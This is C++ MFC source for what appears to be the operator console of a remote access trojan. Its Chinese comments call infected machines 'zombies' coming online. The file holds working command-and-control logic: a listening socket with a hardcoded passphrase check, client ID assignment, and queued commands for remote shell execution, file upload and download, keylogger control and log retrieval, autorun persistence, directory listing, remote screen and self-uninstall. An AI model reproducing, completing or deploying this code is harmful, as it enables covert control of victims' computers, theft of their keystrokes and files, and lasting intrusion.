
// hisfooDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "hisfoo.h"
#include "hisfooDlg.h"
#include "DlgProxy.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// ChisfooDlg 对话框


IMPLEMENT_DYNAMIC(ChisfooDlg, CDialogEx);

BOOL ChisfooDlg::Work_Pcs(SOCKET iSock, unsigned long long UID)
{
	auto ZeroPcs = [&](unsigned long long szTask = 0ULL)->int
	{
		int retEx = send(iSock, reinterpret_cast<char*>(&szTask), sizeof(unsigned long long), 0);
		return move(retEx);
	};
	if (WorkMap.find(UID) == WorkMap.end())
	{
		if (ZeroPcs() <= 0)MessagePcs("传达圣旨时连接错误");
		else return FALSE;
	}
	auto* pData = &WorkMap[UID];
	if (pData->empty())
	{
		if (ZeroPcs() <= 0)MessagePcs("传达圣旨时连接错误");
		return FALSE;
	}
	if (pData->begin() == pData->end())
	{
		if (ZeroPcs() <= 0)MessagePcs("传达圣旨时连接错误");
		return FALSE;
	}
	auto ToPcs = pData->begin();
	unsigned long long SzMethod = ToPcs->Method;
	auto CleanData = [&]()->void
	{
		pData->erase(pData->begin());
		if (pData->begin() == pData->end() || pData->empty())
			WorkMap.erase(UID);
	};
	if (SzMethod == Shell_Method)
	{
		if (ZeroPcs(Shell_Method) <= 0)
		{
			MessagePcs("传达圣旨时连接错误");
			return FALSE;
		}
		unsigned long long SzLen = 0ULL;
		for (auto SzTor = ToPcs->Data.begin(); SzTor != ToPcs->Data.end(); SzTor++)
		{
			memcpy(&SzLen, &**SzTor, sizeof(unsigned long long));
			send(iSock, reinterpret_cast<char*>(&**SzTor), sizeof(unsigned long long), 0);
			SzTor++;
			send(iSock, reinterpret_cast<char*>(&**SzTor), SzLen, 0);
		}
		SzLen = 0ULL;
		send(iSock, reinterpret_cast<char*>(&SzLen), sizeof(unsigned long long), 0);
		CleanData();
		return TRUE;
	}
	else if (SzMethod == Get_Last_Msg)
	{
		if (ZeroPcs(Get_Last_Msg) <= 0)
		{
			MessagePcs("传达圣旨时连接错误");
			return FALSE;
		}
		unsigned long long szLen;
		shared_ptr<byte> pByte(new byte[sizeof(unsigned long long)]);
		recv(iSock, reinterpret_cast<char*>(&*pByte), sizeof(unsigned long long), 0);
		memcpy(&szLen, &*pByte, sizeof(unsigned long long));
		shared_ptr<char> pChar(new char[szLen]);
		recv(iSock, &*pChar, szLen, 0);
		(&*pChar)[szLen - 1] = '\0';
		shared_ptr<ChisfooDlg> NewDlg(new ChisfooDlg);
		char SzChr[MAX_PATH];
		if (_Shell_Call)
			if (*_Shell_Call)
			{
				auto _FxSS = [&](shared_ptr<char> kChar)
				{
					string _Nxstr(&*kChar);
					while (true)
					{
						unsigned long long pos = 0;
						if ((pos = _Nxstr.find(" ", 0)) != string::npos)
							_Nxstr.replace(pos, string(" ").length(), "");
						else break;
					}
					stringstream NxSS;
					NxSS.str(_Nxstr.c_str());
					NxSS.clear();
					while (!NxSS.eof())
					{
						string _ToADD;
						NxSS >> _ToADD;
						tbox->AddStr(_ToADD);
					}
					return;
				};
				thread(_FxSS, pChar).detach();
			}
			else
			{
				if (CopyToClipboard(&*pChar, szLen))
					sprintf_s(SzChr, "%llu号粉丝表示Excited! - 已加入剪贴板豪华午餐", UID);
				else
					sprintf_s(SzChr, "%llu号粉丝表示Excited! - 加入剪贴板失败", UID);
				thread(&ChisfooDlg::MessageBox, NewDlg, &*pChar, SzChr, 0U).detach();
			}
		CleanData();
		return TRUE;
	}
	else if (SzMethod == Uninstall_Me)
	{
		if (ZeroPcs(Uninstall_Me) <= 0)
		{
			MessagePcs("传达圣旨时连接错误");
			return FALSE;
		}
		CleanData();
		return TRUE;
	}
	else if (SzMethod == Set_Client_ID)
	{
		if (ZeroPcs(Set_Client_ID) <= 0)
		{
			MessagePcs("传达圣旨时连接错误");
			return FALSE;
		}
		auto SzTor = ToPcs->Data.begin();
		unsigned long long SzLen = 0ULL;
		memcpy(&SzLen, &**SzTor, sizeof(unsigned long long));
		send(iSock, reinterpret_cast<char*>(&**SzTor), sizeof(unsigned long long), 0);
		CleanData();
		return TRUE;
	}
	else if (SzMethod == File_Upload)
	{
		if (ZeroPcs(File_Upload) <= 0)
		{
			MessagePcs("传达圣旨时连接错误");
			return FALSE;
		}
		unsigned long long is_Support = 0;
		recv(iSock, reinterpret_cast<char*>(&is_Support), sizeof(unsigned long long), 0);
		if (!is_Support)
		{
			CleanData();
			MessagePcs("客户端并不支持接收文件。");
			return FALSE;
		}
		MessagePcs("开始尝试上传文件...");
		string thisPath = reinterpret_cast<char*>(&*(*(ToPcs->Data.begin())));
		string remotePath = reinterpret_cast<char*>(&*(*(++(ToPcs->Data.begin()))));
		ifstream fsRead;
		fsRead.open(thisPath.c_str(), ios::in|ios::binary);
		if (!fsRead)
		{
			CleanData();
			MessagePcs("服务器配置错误，无法访问文件。");
			return FALSE;
		}
		fsRead.seekg(0, fsRead.end);
		unsigned long long srcSize = fsRead.tellg();
		fsRead.close();
		fsRead.clear();
		unsigned long long PathCounter = remotePath.size() + 1;
		send(iSock, reinterpret_cast<char*>(&PathCounter), sizeof(unsigned long long), 0);
		send(iSock, remotePath.c_str(), PathCounter, 0);
		send(iSock, reinterpret_cast<char*>(&srcSize), sizeof(unsigned long long), 0);
		char fBuffer[Pkg_Leng+8ULL];
		unsigned long long latestpkg = 0ULL;
		char FinishMsg[MAX_PATH];
		fsRead.open(thisPath.c_str(), ios::binary);
		while (!fsRead.eof())
		{
			fsRead.read((char*)&*fBuffer, Pkg_Leng);
			latestpkg=fsRead.gcount();
			if (send(iSock, reinterpret_cast<char*>(&latestpkg), sizeof(unsigned long long), 0) < 0)break;
			Sleep(10);
			if (send(iSock, fBuffer, latestpkg, 0) < 0)break;
			Sleep(30);
		}
		latestpkg = 0ULL;
		send(iSock, reinterpret_cast<char*>(&latestpkg), sizeof(unsigned long long), 0);
		sprintf_s(FinishMsg, "成功传输了%llu字节的文件。", srcSize);
		MessagePcs(FinishMsg);
		CleanData();
		fsRead.close();
		fsRead.clear();
		return TRUE;
	}
	else if (SzMethod == File_Download)
	{
		if (ZeroPcs(File_Download) <= 0)
		{
			MessagePcs("传达圣旨时连接错误");
			return FALSE;
		}
		unsigned long long is_Support = 0;
		recv(iSock, reinterpret_cast<char*>(&is_Support), sizeof(unsigned long long), 0);
		if (!is_Support)
		{
			CleanData();
			MessagePcs("客户端并不支持发送文件。");
			return FALSE;
		}
		char FinishMsg[MAX_PATH];
		MessagePcs("开始尝试下载文件...");
		string thisPath = reinterpret_cast<char*>(&*(*(ToPcs->Data.begin())));
		string remotePath = reinterpret_cast<char*>(&*(*(++(ToPcs->Data.begin()))));
		unsigned long long PathCounter = remotePath.size() + 1;
		send(iSock, reinterpret_cast<char*>(&PathCounter), sizeof(unsigned long long), 0);
		Sleep(10);
		send(iSock, remotePath.c_str(), PathCounter, 0);
		unsigned long long FileTransferSize = 0;
		recv(iSock, reinterpret_cast<char*>(&FileTransferSize), sizeof(unsigned long long), 0);
		ofstream _fileCtrl(thisPath.c_str(), ios::binary | ios::out);
		if (!_fileCtrl)
		{
			closesocket(iSock);
			return FALSE;
		}
		char _fBuffer[Pkg_Leng+8ULL];
		unsigned long long fpkgLen = 0ULL;
		recv(iSock, reinterpret_cast<char*>(&fpkgLen), sizeof(unsigned long long), 0);
		int sreti = 1;
		unsigned long long Failed_Counter = 0ULL;
		while (fpkgLen != 0ULL)
		{
			if (fpkgLen > Pkg_Leng)break;
		reGetLen:
			Sleep(35);
			sreti = recv(iSock, (_fBuffer), fpkgLen, 0);
			if (sreti < 0)
			{
				Failed_Counter++;
				if (Failed_Counter > 100ULL)break;
				goto reGetLen;
			}
			_fileCtrl.write(_fBuffer, fpkgLen);
		reGetPkg:
			Sleep(35);
			sreti = recv(iSock, reinterpret_cast<char*>(&fpkgLen), sizeof(unsigned long long), 0);
			if (sreti < 0)
			{
				Failed_Counter++;
				if (Failed_Counter > 100ULL)break;
				goto reGetPkg;
			}
			Sleep(20);
		}
		_fileCtrl.close();
		sprintf_s(FinishMsg, "成功传输了%llu字节的文件。", FileTransferSize);
		MessagePcs(FinishMsg);
		CleanData();
		return TRUE;
	}
	else if (SzMethod == KeyBHook)
	{
		if (ZeroPcs(KeyBHook) <= 0)
		{
			MessagePcs("传达圣旨时连接错误");
			return FALSE;
		}
		unsigned long long is_Support = 0;
		recv(iSock, reinterpret_cast<char*>(&is_Support), sizeof(unsigned long long), 0);
		if (!is_Support)
		{
			CleanData();
			MessagePcs("客户端并不支持键盘记录。");
			return FALSE;
		}
		unsigned long long hMod = 0ULL;
		memcpy(&hMod, &*(*(ToPcs->Data.begin())), sizeof(unsigned long long));
		if (hMod == 3ULL)
		{
			send(iSock, reinterpret_cast<char*>(&hMod), sizeof(unsigned long long), 0);
			string thisPath = "kbLog.log";
			unsigned long long FileTransferSize = 0;
			recv(iSock, reinterpret_cast<char*>(&FileTransferSize), sizeof(unsigned long long), 0);
			ofstream _fileCtrl2(thisPath.c_str(), ios::binary | ios::out);
			if (!_fileCtrl2)
			{
				closesocket(iSock);
				return FALSE;
			}
			char _fBuffer[Pkg_Leng];
			unsigned long long fpkgLen = 0ULL;
			recv(iSock, reinterpret_cast<char*>(&fpkgLen), sizeof(unsigned long long), 0);
			int sreti = 1;
			while (fpkgLen != 0ULL)
			{
				sreti = recv(iSock, reinterpret_cast<char*>(&*_fBuffer), fpkgLen, 0);
				if (sreti < 0)break;
				_fileCtrl2.write(_fBuffer, fpkgLen);
				sreti = recv(iSock, reinterpret_cast<char*>(&fpkgLen), sizeof(unsigned long long), 0);
				Sleep(50);
				if (sreti < 0)break;
			}
			_fileCtrl2.close();
			MessagePcs("键盘记录信息于程序目录下的kbLog.log");
			CleanData();
			return TRUE;
		}
		send(iSock, reinterpret_cast<char*>(&hMod), sizeof(unsigned long long), 0);
		CleanData();
		return TRUE;
	}
	else if (SzMethod == Auto_Run)
	{
		if (ZeroPcs(Auto_Run) <= 0)
		{
			MessagePcs("传达圣旨时连接错误");
			return FALSE;
		}
		unsigned long long is_Support = 0;
		recv(iSock, reinterpret_cast<char*>(&is_Support), sizeof(unsigned long long), 0);
		if (!is_Support)
		{
			CleanData();
			MessagePcs("客户端并不支持自启动模式。");
			return FALSE;
		}
		auto pSzData = ToPcs->Data.begin();
		memcpy(&is_Support, &*(*(pSzData)), sizeof(unsigned long long));
		send(iSock, reinterpret_cast<char*>(&is_Support), sizeof(unsigned long long), 0);
		recv(iSock, reinterpret_cast<char*>(&is_Support), sizeof(unsigned long long), 0);
		shared_ptr<char>_LBuffer(new char[is_Support]);
		recv(iSock, &*_LBuffer, is_Support, 0);
		MessagePcs(&*_LBuffer);
	}
	else if (SzMethod == File_List)
	{
		if (ZeroPcs(File_List) <= 0)
		{
			MessagePcs("传达圣旨时连接错误");
			return FALSE;
		}
		unsigned long long RespBuffer = 0;
		recv(iSock, reinterpret_cast<char*>(&RespBuffer), sizeof(unsigned long long), 0);
		if (!RespBuffer)
		{
			CleanData();
			MessagePcs("客户端并不支持查找文件、文件夹。");
			return FALSE;
		}
		RespBuffer = strlen((char*)&*(*(ToPcs->Data.begin()))) + 1;
		send(iSock, (char*)&RespBuffer, sizeof(unsigned long long), 0);
		send(iSock, (char*)&*(*(ToPcs->Data.begin())), RespBuffer, 0);
		recv(iSock, (char*)&RespBuffer, sizeof(unsigned long long), 0);
		vector<string> FileAllPath;
		vector<string> FolderAllPath;
		char PathAllPath[MAX_PATH];
		while (RespBuffer)
		{
			if (recv(iSock, PathAllPath, RespBuffer, 0) < 0)break;
			FileAllPath.push_back(PathAllPath);
			if (recv(iSock, (char*)&RespBuffer, sizeof(unsigned long long), 0) < 0)break;
		}
		recv(iSock, (char*)&RespBuffer, sizeof(unsigned long long), 0);
		while (RespBuffer)
		{
			if (recv(iSock, PathAllPath, RespBuffer, 0) < 0)break;
			FolderAllPath.push_back(PathAllPath);
			if (recv(iSock, (char*)&RespBuffer, sizeof(unsigned long long), 0) < 0)break;
		}
		if (_file_trs_dlg)_file_trs_dlg->Change_File_Data(FileAllPath, FolderAllPath);
	}
	else if (SzMethod == Remote_Screen)
	{
		if (ZeroPcs(Remote_Screen) <= 0)
		{
			MessagePcs("传达圣旨时连接错误");
			return FALSE;
		}
		unsigned long long RespBuffer = 0;
		recv(iSock, reinterpret_cast<char*>(&RespBuffer), sizeof(unsigned long long), 0);
		if (!RespBuffer)
		{
			CleanData();
			MessagePcs("客户端并不支持远程屏幕，请检查版本。");
			return FALSE;
		}
		MessagePcs("已经命令执行，请确保插件正常，网络通畅。");
	}
	else if (SzMethod == Load_Lib)
	{
		// Ha
	}
	else
	{
		if (ZeroPcs() <= 0)MessagePcs("传达圣旨时连接错误");
		CleanData();
		return FALSE;
	}
	// 不支持的内容，图灵测试不通过返回默认值
	if (ZeroPcs() <= 0)MessagePcs("传达圣旨时连接错误");
	CleanData();
	return FALSE;
}

void ChisfooDlg::NetWork_Pcs()
{
	//初始化WSA    
	_Thr_Flag = 1U;
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		MessagePcs("程序内部错误，请寻找开发者获取帮助。");
		_Thr_Flag = 0U;
		return;
	}

	//创建套接字    
	slisten = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (slisten == INVALID_SOCKET)
	{
		MessagePcs("无效管道，请充新运行程序。");
		_Thr_Flag = 0U;
		return;
	}

	//绑定IP和端口    
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(Listen_Port);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	if (::bind(slisten, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		MessagePcs("绑定端口的时候出现严重错误，请重新运行程序。");
		_Thr_Flag = 0U;
		return;
	}

	//开始监听    
	if (listen(slisten, 5) == SOCKET_ERROR)
	{
		MessagePcs("管道出错，请重新运行程序。");
		_Thr_Flag = 0U;
		return;
	}
	// 多线程等待肉鸡上线
	SOCKET sClient;
	sockaddr_in remoteAddr;
	int nAddrlen = sizeof(remoteAddr);

	int nNetTimeout = Wait_Time; // -1s
	while (Pcs_Flag)
	{
		// 等待肉鸡上线
		sClient = accept(slisten, (SOCKADDR *)&remoteAddr, &nAddrlen);

		if (sClient == INVALID_SOCKET)
		{
			// 有问题的管道
			continue;
		}

		//发送时限
		setsockopt(sClient, SOL_SOCKET, SO_SNDTIMEO, (char *)&nNetTimeout, sizeof(int));
		//接收时限
		setsockopt(sClient, SOL_SOCKET, SO_RCVTIMEO, (char *)&nNetTimeout, sizeof(int));

		// 肉鸡上线
		shared_ptr<char> pAuth(new char[strlen(HELEN_IS_A_BITCH) + 1]);
		int ret = recv(sClient, &*pAuth, strlen(HELEN_IS_A_BITCH) + 1, 0);
		if (ret <= 0)
		{
			closesocket(sClient);
			continue;
		}
		else if (string(&*pAuth) != string(HELEN_IS_A_BITCH))
		{
			closesocket(sClient);
			continue;
		}
		unsigned long long szCID = 0;
		recv(sClient, reinterpret_cast<char*>(&szCID), sizeof(unsigned long long), 0);
		if (szCID == 0)
		{
			shared_ptr<char>pDataX(new char[sizeof(unsigned long long)]);
			unsigned long long szMethod = Set_Client_ID;
			memcpy(&*pDataX, &szMethod, sizeof(unsigned long long));
			int ret = send(sClient, reinterpret_cast<char*>(&*pDataX), sizeof(unsigned long long), 0);
			if (ret <= 0)
			{
				closesocket(sClient);
				continue;
			}
			memcpy(&*pDataX, &_Cli_Count, sizeof(unsigned long long));
			_Cli_Count++;
			ret = send(sClient, reinterpret_cast<char*>(&*pDataX), sizeof(unsigned long long), 0);
			closesocket(sClient);
			continue;
		}
		if (szCID > _Cli_Count)
			_Cli_Count = szCID + 1;
		bool WFind = false;
		for (auto szPtr = userList.begin(); szPtr != userList.end(); szPtr++)
		{
			if (szPtr->CID == szCID)
			{
				szPtr->_Last_Time = chrono::system_clock::now();
				WFind = true;
				break;
			}
		}
		if (!WFind)
		{
			UserData _UData;
			_UData.CID = szCID;
			_UData._Last_Time = chrono::system_clock::now();
			/*if (!_NetLock.try_lock_for(chrono::minutes(10)))
			{
				std::bad_function_call _CALL;
				wcout << L"或许是服务器性能过低，引起了一个严重的错误。" << endl;
				throw _CALL;
			}*/
			userList.push_back(_UData);
			//_NetLock.unlock();
			UserOperate(szCID, 2ULL, remoteAddr);
		}
		if (Work_Pcs(sClient, szCID))
		{
			stringstream NxSS;
			NxSS << szCID;
			string NxStr;
			NxSS >> NxStr;
			MessagePcs(string(NxStr + string("已经执行陛下的指令")));
		}
		closesocket(sClient);
		BOOL bDontLinger = FALSE;
		setsockopt(sClient, SOL_SOCKET, SO_DONTLINGER, (const char*)&bDontLinger, sizeof(BOOL));
	}
	_Thr_Flag = 0U;
	return;
}

void ChisfooDlg::Offline_Pcs()
{
	/*if (!_NetLock.try_lock_for(chrono::minutes(10)))
	{
		std::bad_function_call _CALL;
		wcout << L"或许是服务器性能过低，引起了一个严重的错误。" << endl;
		throw _CALL;
	}*/
	while (Pcs_Flag)
	{
		for (auto szPtr = userList.begin(); szPtr != userList.end(); szPtr++)
		{
			if (chrono::system_clock::now() - szPtr->_Last_Time > chrono::milliseconds(8 * Wait_Time))
			{
				stringstream NxSS;
				NxSS << szPtr->CID;
				string NxStr;
				NxSS >> NxStr;
				string _Buf = NxStr;
				NxStr += "号红军待命";
				int szListLoc = puserlist.FindString(-1, NxStr.c_str());
				MessagePcs(string(_Buf + "号红军逃跑"));
				if (szListLoc != LB_ERR)
				{
					puserlist.DeleteString(szListLoc);
				}
				szPtr++;
				userList.erase(--szPtr);
				if (szPtr == userList.end())break;
			}
		}
		Sleep(Wait_Time);
	}
	//_NetLock.unlock();
}

void ChisfooDlg::_VFUNC(unsigned long long CID)
{
	CString CSTRBuf;
	CLData SzCDATA;
	SzCDATA.Method = Get_Last_Msg;
	auto Pcs_Com = [&](unsigned long long UID, CLData userData)
	{
		if (WorkMap.find(UID) == WorkMap.end())
		{
			WorkMap.insert(make_pair(UID, list<CLData>()));
		}
		WorkMap[UID].push_back(userData);
	};
	if (CID == 0ULL)
	{
		for (auto UListTor = userList.begin(); UListTor != userList.end(); UListTor++)
		{
			Pcs_Com(UListTor->CID, SzCDATA);
		}
	}
	else
	{
		Pcs_Com(CID, SzCDATA);
	}
	MessagePcs("已经要求返回最后的结果");
	char SzChr[MAX_PATH];
	sprintf_s(SzChr, "钦点了%llu个粉丝。", (
		[&]()->unsigned long long {if (CID != 0ULL)return 1ULL; else return userList.size(); })()
	);
	MessagePcs(SzChr);
}

void ChisfooDlg::_GoShell(unsigned long long CID, string Shell)
{
	auto Pcs_Com = [&](unsigned long long UID, CLData userData)
	{
		if (WorkMap.find(UID) == WorkMap.end())
		{
			WorkMap.insert(make_pair(UID, list<CLData>()));
		}
		WorkMap[UID].push_back(userData);
	};
	CLData SzCDATA;
	SzCDATA.Method = Shell_Method;
	shared_ptr<byte>_pLen(new byte[sizeof(unsigned long long)]);
	unsigned long long ScLen = strlen(Shell.c_str()) + 1ULL;
	memcpy(&*_pLen, &ScLen, sizeof(unsigned long long));
	shared_ptr<byte>_pCom(new byte[strlen(Shell.c_str()) + 1]);
	memcpy(&*_pCom, Shell.c_str(), strlen(Shell.c_str()) + 1);
	SzCDATA.Data.push_back(_pLen);
	SzCDATA.Data.push_back(_pCom);
	if (CID == 0ULL)
	{
		for (auto UListTor = userList.begin(); UListTor != userList.end(); UListTor++)
		{
			Pcs_Com(UListTor->CID, SzCDATA);
		}
	}
	else
	{
		Pcs_Com(CID, SzCDATA);
	}
}

void ChisfooDlg::MessagePcs(string Msg)
{
	while (pmsgbox.GetCount() > 1000)pmsgbox.DeleteString(0U);
	pmsgbox.AddString(Msg.c_str());
	SendDlgItemMessage(IDC_LIST2, WM_VSCROLL, SB_BOTTOM, 0);
	return;
}

void ChisfooDlg::UserOperate(unsigned long long UserID, unsigned long long Mode)
{
	if (Mode & 1ULL)
	{
		puserlist.ResetContent();
	}
	if (Mode & 2ULL)
	{
		stringstream NxSS;
		NxSS << UserID;
		string NxStr;
		NxSS >> NxStr;
		string _Buf = NxStr;
		NxStr += "号红军待命 ";

		puserlist.AddString(NxStr.c_str());
		MessagePcs(string(_Buf + "号红军入列"));
	}
	if (Mode & 4ULL)
	{
		puserlist.DeleteString(UserID);
	}
	if (Mode & 8ULL)
	{
		for (auto cTor = userList.begin(); cTor != userList.end(); cTor++)
		{
			UserOperate((*cTor).CID, 2ULL);
		}
	}
	while (puserlist.GetCount() > 1000)
	{
		puserlist.DeleteString(0U);
	}
	return;
}

void ChisfooDlg::UserOperate(unsigned long long UserID, unsigned long long Mode, sockaddr_in & sCli)
{
	if (Mode & 1ULL)
	{
		puserlist.ResetContent();
	}
	if (Mode & 2ULL)
	{
		stringstream NxSS;
		NxSS << UserID;
		string NxStr;
		NxSS >> NxStr;
		string _Buf = NxStr;
		NxStr += "号红军待命 ";
		NxStr += inet_ntoa(sCli.sin_addr);
		puserlist.AddString(NxStr.c_str());
		MessagePcs(string(_Buf + "号红军入列"));
	}
	if (Mode & 4ULL)
	{
		puserlist.DeleteString(UserID);
	}
	if (Mode & 8ULL)
	{
		for (auto cTor = userList.begin(); cTor != userList.end(); cTor++)
		{
			UserOperate((*cTor).CID, 2ULL);
		}
	}
	while (puserlist.GetCount() > 1000)
	{
		puserlist.DeleteString(0U);
	}
	return;
}

ChisfooDlg::ChisfooDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_HISFOO_DIALOG, pParent)
{
	EnableActiveAccessibility();
	m_hIcon = AfxGetApp()->LoadIcon(IDI_ICON1);
	m_pAutoProxy = NULL;
}

ChisfooDlg::~ChisfooDlg()
{
	// 如果该对话框有自动化代理，则
	//  将此代理指向该对话框的后向指针设置为 NULL，以便
	//  此代理知道该对话框已被删除。
	if (m_pAutoProxy != NULL)
		m_pAutoProxy->m_pDialog = NULL;
}

void ChisfooDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, puserlist);
	DDX_Control(pDX, IDC_LIST2, pmsgbox);
}

BEGIN_MESSAGE_MAP(ChisfooDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON3, &ChisfooDlg::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON1, &ChisfooDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &ChisfooDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDCANCEL, &ChisfooDlg::OnBnClickedCancel)
	ON_BN_CLICKED(IDC_BUTTON4, &ChisfooDlg::OnBnClickedButton4)
END_MESSAGE_MAP()


// ChisfooDlg 消息处理程序

BOOL ChisfooDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	_Thr_Pcs.push_back(thread(&ChisfooDlg::NetWork_Pcs, this));
	_Thr_Pcs.back().detach();

	_Thr_Pcs.push_back(thread(&ChisfooDlg::Offline_Pcs, this));
	_Thr_Pcs.back().detach();

	AdjustWindowsSize();    //调整窗口大小与桌面工作区相同
	ReSize();                //调整当前窗口中所有控件大小，以适应当前屏幕分辨率

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void ChisfooDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR ChisfooDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

// 当用户关闭 UI 时，如果控制器仍保持着它的某个
//  对象，则自动化服务器不应退出。  这些
//  消息处理程序确保如下情形: 如果代理仍在使用，
//  则将隐藏 UI；但是在关闭对话框时，
//  对话框仍然会保留在那里。

void ChisfooDlg::OnClose()
{
	if (CanExit())
		CDialogEx::OnClose();
}

void ChisfooDlg::OnOK()
{
	if (CanExit())
		CDialogEx::OnOK();
}

void ChisfooDlg::OnCancel()
{
	if (CanExit())
		CDialogEx::OnCancel();
}

BOOL ChisfooDlg::CanExit()
{
	// 如果代理对象仍保留在那里，则自动化
	//  控制器仍会保持此应用程序。
	//  使对话框保留在那里，但将其 UI 隐藏起来。
	if (m_pAutoProxy != NULL)
	{
		ShowWindow(SW_HIDE);
		return FALSE;
	}

	return TRUE;
}



void ChisfooDlg::OnBnClickedButton3()
{
	// TODO: 在此添加控件通知处理程序代码
	CString CSTRBuf;
	GetDlgItemTextA(IDC_EDIT1, CSTRBuf);
	string SStr = CSTRBuf.GetString();
	unsigned long long SzNID = 1ULL;
	if (SStr != string(""))
	{
		stringstream NxSS;
		NxSS << SStr;
		NxSS >> SzNID;
	}
	else
	{
		MessageBox("出现微小的错误\n请检查是否输入了数值。", "不符合基本法", 0U);
		return;
	}
	auto Pcs_Com = [&](unsigned long long UID, CLData userData)
	{
		if (WorkMap.find(UID) == WorkMap.end())
		{
			WorkMap.insert(make_pair(UID, list<CLData>()));
		}
		WorkMap[UID].push_back(userData);
	};
	GetDlgItemTextA(IDC_EDIT2, CSTRBuf);
	SStr = CSTRBuf.GetString();
	if (SStr != string("") && SStr != string("e"))
	{
		CLData SzCDATA;
		SzCDATA.Method = Shell_Method;
		shared_ptr<byte>_pLen(new byte[sizeof(unsigned long long)]);
		unsigned long long ScLen = strlen(SStr.c_str()) + 1ULL;
		memcpy(&*_pLen, &ScLen, sizeof(unsigned long long));
		shared_ptr<byte>_pCom(new byte[strlen(SStr.c_str()) + 1]);
		memcpy(&*_pCom, SStr.c_str(), strlen(SStr.c_str()) + 1);
		SzCDATA.Data.push_back(_pLen);
		SzCDATA.Data.push_back(_pCom);
		if (SzNID == 0ULL)
		{
			for (auto UListTor = userList.begin(); UListTor != userList.end(); UListTor++)
			{
				Pcs_Com(UListTor->CID, SzCDATA);
			}
		}
		else
		{
			Pcs_Com(SzNID, SzCDATA);
		}
	}
	else if (SStr == "e")
	{
		auto Pcs_Com = [&](unsigned long long UID, CLData userData)
		{
			if (WorkMap.find(UID) == WorkMap.end())
			{
				WorkMap.insert(make_pair(UID, list<CLData>()));
			}
			WorkMap[UID].push_back(userData);
		};
		CLData SzCDATA;
		SzCDATA.Method = Uninstall_Me;
		if (SzNID == 0ULL)
		{
			for (auto UListTor = userList.begin(); UListTor != userList.end(); UListTor++)
			{
				Pcs_Com(UListTor->CID, SzCDATA);
			}
		}
		else
		{
			Pcs_Com(SzNID, SzCDATA);
		}
	}
	GetDlgItemTextA(IDC_EDIT3, CSTRBuf);
	SStr = CSTRBuf.GetString();
	if (SStr != string("") && SzNID != 0ULL)
	{
		CLData SzCDATA;
		SzCDATA.Method = Set_Client_ID;
		stringstream NxSS;
		NxSS << SStr;
		unsigned long long NEWCID;
		NxSS >> NEWCID;
		shared_ptr<byte>_pLen(new byte[sizeof(unsigned long long)]);
		memcpy(&*_pLen, &NEWCID, sizeof(unsigned long long));
		SzCDATA.Data.push_back(_pLen);
		Pcs_Com(SzNID, SzCDATA);
	}
	MessageBox("已经添加了命令，请点击获取相应以远程获取回应。\n"\
		"可以选择自动获取回应，方便实时获取shell结果。\n"\
		"更多内容可以联系作者 Saurik king@ithot.top","执行成功",0U);
	char SzChr[MAX_PATH];
	sprintf_s(SzChr, "钦点了%llu个粉丝。", (
		[&]()->unsigned long long {if (SzNID != 0ULL)return 1ULL; else return userList.size(); })()
	);
	MessagePcs(SzChr);
	return;
}


void ChisfooDlg::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	tbox.reset(new Ccmdline);
	_Shell_Call.reset(new unsigned);
	*_Shell_Call = 1;
	tbox->tDlg = this;
	CString CSTEX;
	GetDlgItemTextA(IDC_EDIT1, CSTEX);
	stringstream Nxss;
	Nxss << CSTEX.GetString();
	unsigned long long NIDE;
	Nxss >> NIDE;
	tbox->CID = NIDE;
	tbox->DoModal();
}



void ChisfooDlg::OnBnClickedButton2()
{
	// TODO: 在此添加控件通知处理程序代码
	/*
	auto hDll = LoadLibrary("options.d");
	if (!hDll)
	{
		MessageBox("无法加载外部模块，请检查是否已经置入了模块。", 0, MB_ICONERROR);
		return;
	}
	typedef int(__stdcall *SzCall)(CWnd*);
	SzCall _SzC = reinterpret_cast<SzCall>(GetProcAddress(hDll, "_HA_MAIN"));
	if (!_SzC)
	{
		MessageBox("函数调用过程失败。请检查入口函数规范。", 0, MB_ICONERROR);
		return;
	}
	thread(_SzC, this).detach();
	*/
	shared_ptr<moreopt> _MoreOpt(new moreopt);
	_MoreOpt->CallBackEnv = this;
	thread(&moreopt::DoModal, _MoreOpt).detach();
	return;
}


void ChisfooDlg::OnBnClickedCancel()
{
	// TODO: 在此添加控件通知处理程序代码
